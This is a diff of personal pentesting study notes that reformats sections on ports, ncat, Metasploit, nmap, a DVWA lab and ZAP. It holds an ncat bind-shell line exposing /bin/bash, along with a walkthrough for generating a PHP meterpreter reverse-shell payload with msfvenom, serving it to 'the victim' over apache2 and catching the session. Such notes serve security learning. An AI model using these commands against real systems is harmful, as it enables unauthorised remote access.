@@ -11,7 +11,7 @@ There are 65535 port numbers (2^16).
 67 and 68: DHCP (Dynamic Host Configuration Protocol --> Assigns IP adresses to devices dynamically)
 80: HTTP (Hypertext Transfer Protocol --> Makes world wide web possible)
 110: POP3 (Post Office Protocol --> For receiving emails)
-123: NTP (Network Time Protocol --> Clocks synchronization)
+123: NTP (Network Time Protocol --> Clock synchronization)
 143: IMAP (Internet Message Access Protocol --> For receiving emails)
 179: BGP (Boder Gateway Protocol --> Used for establish connections between large networks)
 443: HTTPS (Hypertext Transfer Protocol Secure --> Secure and encrypted version of http)
@@ -75,47 +75,81 @@ Running a command on the client side, will run the command on the host machine a
 ncat -l --exec "/bin/bash" 127.0.0.1 8080
 ```
 
+>[!Note]
+>`ncat` = `nc`
 
-------------------------ARMITAGE (Graphical user interface for Metasploit)------------------------
 
 ## Metasploit
 
-*(S): For shell commands
+- Metasploit modules 
+	- Exploits
+	- Payloads
+	- Auxiliary
+	- Encoders
+	- Nops
+	- Posts
+	- Evasion
 
-// Metasploit modules are: Exploits, payloads, auxiliary, encoders, nops, posts, evasion.
-// Modules are located in: /usr/share/metasploit-framework/modules
-// Try to run the database service to initialize the msf faster 'service postgresql start'
-// Dictionaries for brute-force attacks available at /usr/share/metasploit-framework/data/wordlists
+Modules are located in: `/usr/share/metasploit-framework/modules`
 
-msfdb (Manage metasploit framework database) (S)
-msfconsole (Intiallize the metasploit framework) (S)
+>[!Note]
+>- Try to run the database service to initialize the msf faster 'service postgresql start'
+>- Dictionaries for brute-force attacks available at /usr/share/metasploit-framework/data/wordlists
 
-banner (Display a banner)
-db_status (Check the metasploit frmaework database status)
-use <module> (Use a certain metasploit module)
-show <options> (Show information about a moudule)
-set <option> <value> (Set options, use 'show options' to see them)
-search <field> <parameter> (Make queries about modules. e.g. type:payload)
-back (Return to metasploit framework main command line interface)
-run (Running an auxiliary)
-exploit (Running an exploit)
 
-// msfvenom is a payload generator
-// For instance, we can make a reverse shell  by using the payload 'php/meterpreter/reverse_tcp'
+``` Shell
+msfdb // Manage metasploit framework database
+msfconsole // Initiallize the metasploit framework
+```
 
+Once on the Metasploit framework:
+
+```Metasploit
+banner // Display a banner
+db_status // Check the metasploit framework database status
+use <module> // Use a certain metasploit module
+show <options> // Show information about a moudule
+set <option> <value> // Set options, use 'show options' to see them
+search <field> <parameter> // Make queries about modules. e.g. type:payload
+back // Return to metasploit framework main command line interface
+run // Running an auxiliary
+exploit // Running an exploit
+```
+
+>[!Note]
+>_msfvenom_ is a payload generator
+
+For instance, we can make a reverse shell  by using the payload: `php/meterpreter/reverse_tcp`
+
+```Metasploit
 msfvenom -p <payload> <option>=<value> <other optional flags> > <file name to contain the payload>
-msfvenom -p php/meterpreter/reverse_tcp LHOST=<Our ip address> LPORT=4444 -e php/base64 -f raw > shell.php (Setting the payload with our machine listening. '-e' flag for setting an appropiate encoder, '-f' flag for setting the file format as a raw file, also we are saving the payload into 'shell.php' file)
+```
 
-// LPORT is 4444 by default (try 'msfvenom -p <payload> --list-options' for looking for options)
-// Inside the file we'll find a single line of base64 encoded payload, so we wrap that line like that:
+Setting the payload with our machine listening. '-e' flag for setting an appropiate encoder, '-f' flag for setting the file format as a raw file, also we are saving the payload into 'shell.php' file
+
+```Metasploit
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<Our ip address> LPORT=4444 -e php/base64 -f raw > shell.php
+```
+
+LPORT is 4444 by default (try `msfvenom -p <payload> --list-options` to looking for options)
+
+Inside the file we'll find a single line of base64 encoded payload, so we wrap that line like that:
+
+```
 <?php
 <encoded payload>
 ?>
-// Then the machine will read it as php code
+```
 
-// Now we can start an apache2 web server so the victim download the payload from there. Copy the file into '/var/www/html', start the server and enter your ip adress into the browser.
-// Go to msfconsole and use 'exploit/multi/handler' then set LHOST to your address and run the exploit for start listening. Once the victim machine opens the file a session will be created.
+Then the machine will read it as php code.
 
+Now we can start an _apache2 web server_ so the victim download the payload from there. 
+Copy the file into `/var/www/html`, start the server and enter your ip adress into the browser.
+
+Go to msfconsole and use `exploit/multi/handler` then set LHOST to your address and run the exploit for start listening. Once the victim machine opens the file a session will be created.
+
+>[!Note]
+>_ARMITAGE_ -> Graphical user interface for Metasploit
 
 
 ## NMAP
@@ -123,6 +157,8 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<Our ip address> LPORT=4444 -e php
 // Use -sS for a stealth scan, -sT flag is louder. Use -sV for showing services version
 
 nmap <flags> <IP adress> (See open ports)
+
+
 
 
 ---------------------------------------------------------------------------------------------------
@@ -148,7 +184,7 @@ mv config.inc.php.dist config.inc.php
 // Enter localhost and create database
 // Log in with admin123:password
 
---------------------------------------ZED ATTACK PROXY---------------------------------------------
+---------------------------------ZED ATTACK PROXY---------------------------------------------
 
 // Install zaproxy
 // For quick scan use: http://www.webscanttest.com
